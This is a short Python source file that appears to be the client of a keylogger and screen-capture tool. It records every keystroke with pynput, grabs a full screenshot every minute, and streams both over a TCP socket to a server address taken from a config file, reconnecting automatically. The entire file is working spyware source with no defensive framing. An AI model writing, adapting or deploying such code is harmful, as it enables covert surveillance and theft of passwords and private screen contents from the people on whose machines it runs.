from pynput import keyboard
import socket
import time
import threading
import json
from PIL import ImageGrab
import io

DEFAULT_IP="127.0.0.1"
DEFAULT_PORT=12345

class KeyClient:
    def __init__(self):
        self.sock=None
        self.ip=None
        self.port=None
    #get ip and port from json file
    def get_values(self):
        try:
            j = open("config.json", "r")
            config = json.load(j)
            self.ip = config["IP"]
            self.port = config["PORT"]
        except:
            self.ip=DEFAULT_IP
            self.port=DEFAULT_PORT
    #connect to server
    def connect(self):
        self.get_values()
        while True:
            try:
                if self.sock is None:
                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.sock.connect((self.ip, self.port))
                #check Connection
                self.sock.sendall("".encode())
            except Exception as e:
                print(e)
                if self.sock:
                    self.sock.close()
                self.sock=None
            time.sleep(3)

    def on_press(self, key):
        key=str(key)
        key_bytes=key.encode()
        key_length=len(key).to_bytes(4,byteorder="big")
        cmd="key".encode()
        length_cmd=len(cmd).to_bytes(4,byteorder="big")
        try:
            #massage will like something like this: 003key0003'h'
            self.sock.sendall(length_cmd+cmd+key_length+key_bytes)
        except Exception as e:
            print(e)

    def take_screenshot(self):
        while True:
            image=ImageGrab.grab()
            buffer = io.BytesIO()
            #save image in memory instead of disk
            image.save(buffer, format="PNG")
            img_bytes = buffer.getvalue()
            size = len(img_bytes)
            header = size.to_bytes(4,byteorder="big")#transfer int into bytes
            cmd=b"image"
            length_cmd=len(cmd).to_bytes(4,byteorder="big")
            try:
                self.sock.sendall(length_cmd+cmd+header+img_bytes)
            except Exception as e:
                #no need to do anything when there is an error
                #the client will try to reconnect and send again
                print (e)
            #send a screenshot every minute
            time.sleep(60)

    def run(self):
        t1=threading.Thread(target=self.connect,daemon=True)
        t1.start()
        t2 = threading.Thread(target=self.take_screenshot, daemon=True)
        t2.start()
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        listener.join()




if __name__ == "__main__":
    KeyClient().run()